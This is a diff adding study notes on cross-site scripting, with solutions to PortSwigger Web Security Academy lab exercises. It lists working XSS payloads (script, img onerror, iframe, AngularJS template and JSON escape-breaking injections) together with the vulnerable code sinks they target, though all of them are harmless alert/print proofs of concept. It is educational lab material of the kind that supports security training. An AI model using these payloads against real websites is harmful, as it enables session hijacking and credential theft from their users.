@@ -1,0 +1,120 @@
+3 types XSS:
+- Reflected XSS: from current HTTP request
+- Stored XSS: from website database
+- DOM-based XSS: vuln exist in client-site code rather than server-side code
+
+Used for:
+- Impersonate or masquerade as the victim user.
+- Carry out any action that the user is able to perform.
+- Read any data that the user is able to access.
+- Capture the user's login credentials.
+- Perform virtual defacement of the web site.
+- Inject trojan functionality into the web site.
+
+Payload:
+- <script>alert(1)</script>
+- <svg onload=alert(1)>
+- <img src=1 onerror=alert(1)>
+
+Reflected XSS:
+- <script>/* Bad stuff here... */</script>
+- Can be found quickly and reliably using Burp Suite scanner.
+- Finding process:
++ Test every entry point: parameters, data within the url query string, message body, HTTP headers
++ Determine the reflection context: Each location, check if input value appear
++ Test different payload
+
+Stored XSS:
+- Same as reflected XSS, but it store malicious data in db and use it later to trigger
+- Any out-of-band can allow attacker to deliver data into application
+- Test locate link between entry and exit points
+
+DOM-based XSS:
+- Arise when JS takes data from attacker and pass it to a sink that support dynamic code execution (eval(), innerHTML). Typically accessed with 'window.location' object
+- Note: 
++ Chrome/Firefox/Safari auto URL-encode location.search, location.hash, but old IE11/Edge is not -> if data is encoded before process, attacker is harder
++ In Chrome's developer tools, you can use Control+Shift+F to search all the page's JavaScript code for the source.
+- Exploiting DOM XSS with different sources and sinks:
++ Payload:
+    document.write('... <script>alert(document.domain)</script> ...');
+    element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
++ Sources and sinks in third-party dependencies
+    + DOM XSS in jQuery: (5, 6)
+        + 'attr()' function can change attribute of DOM
+            $(function() {
+                $('#backLink').attr("href",
+                    (new URLSearchParams(window.location.search)).get('returnUrl')
+                );
+            });
+            <a id="backLink" href="javascript:alert(1)">Back</a>
+        + '$()' use selector function with 'location.hash' for animation and auto-scrolling to particular element on page, often implemented using a vulnerable 'hashchange' event
+            $(window).on('hashchange', function() {
+                var element = $(location.hash);
+                element[0].scrollIntoView();
+            });
+            <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print()>'">
+    + DOM XSS in AngularJS: (11)
+        + https://breachforce.net/portswigger-xss-dom-angularjs
+        + When a site uses the ng-app attribute on an HTML element
+        + Possible to execute JavaScript without angle brackets or events
+            {{$on.constructor('alert(1)')()}}
+- DOM XSS combined with reflected and stored datas: (12, 13)
++ document.cookie and document["cookie"] (https://github.com/antoinenguyen-09/Portswigger-Web-Security-Labs/blob/main/BSCP_Practice_Exam.md)
+- Which sinks can lead to DOM-XSS vulnerabilities? https://portswigger.net/web-security/cross-site-scripting/dom-based
+
+01_Reflected_XSS_into_HTML_context_with_nothing_encoded
+- XSS in search: <script>alert(1)</script>
+
+02_Stored_XSS_into_HTML_context_with_nothing_encoded
+- Post a comment contain: <script>alert(1)</script>
+
+03_DOM_XSS_in_document.write_sink_using_source_location.search
+- Try to search random thing and you will see: document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+- Break out of img: "><script>alert(1)</script>"
+
+04_DOM_XSS_in_innerHTML_sink_using_source_location.search
+- The 'innerHTML' sink doesn't accept <script> elements on any modern browser, nor will svg onload events fire.
+- Need to use alternative elements like <img> or <iframe>, using event handlers such as 'onload' and 'onerror'
+- Search payload: <img src=1 onerror=alert(1)>
+
+05_DOM XSS_in_jQuery_anchor_href_attribute_sink_using_location.search_source
+- Search for 'attr()' function, returnPath param is passed to attr
+- Payload: /feedback?returnPath=javascript:alert(1)
+
+06_DOM_XSS_in_jQuery_selector_sink_using_a_hashchange_event
+- Test url+'#A', if jquery in response, web is using jquery
+- <iframe src="https://{url}/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
+
+10_DOM XSS in document.write sink using source location.search inside a select element
+- Search for document.write to check vuln
+- Payload /product?productId=1&storeId=</option></select><script>alert(1)</script>
+<select name="storeId">
+  <option selected> </option></select><script>alert(1)</script> </option>
+  <option>London</option>
+  <option>Milan</option>
+</select>
+
+11_DOM_XSS_in_AngularJS_expression_with_angle_brackets_and_double_quotes_HTML_encoded
+- You can use any method in https://breachforce.net/portswigger-xss-dom-angularjs
+- Payload: {{ $eval.constructor('alert(1)')() }}
+
+12_Reflected_DOM_XSS
+- You can easily find vuln function in search by read js file and it display in response 
+    eval('var searchResultsObj = ' + this.responseText);
+    displaySearchResults(searchResultsObj);
+- Try different payload and check the behavior of it
+- Payload: a\"};alert(1);//
+    + Explain:  \" -> \\":  char '\' will be escape by '\\' and allow " to get out of string
+                //: comment all text after this
+    {"results":[],"searchTerm":"a\\"};alert(1);//"}
+
+13_Stored_DOM_XSS
+- https://siunam321.github.io/ctf/portswigger-labs/Cross-Site-Scripting/xss-13/
+- Load comment: 
+    let comments = JSON.parse(this.responseText);
+    displayComments(comments);
++ function escapeHTML(html) { return html.replace('<', '&lt;').replace('>', '&gt;'); }
++ let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
+  firstPElement.innerHTML = newInnerHtml
+- According to w3school, this escapeHTML only replace first instance (https://www.w3schools.com/jsref/jsref_replace.asp)
+- Payload for name param: <><img src=1 onerror=alert(1)>
